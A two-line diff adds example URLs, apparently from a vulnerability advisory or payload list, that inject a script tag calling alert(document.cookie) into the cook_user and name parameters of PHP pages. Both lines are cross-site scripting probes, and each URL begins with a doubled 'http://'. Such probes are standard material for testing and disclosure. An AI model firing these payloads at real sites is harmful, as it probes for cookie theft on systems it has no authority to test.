@@ -1,0 +1,2 @@
+http://http://www.example.com/path/index.php?cook_user=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://http://www.example.com/path/modules.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
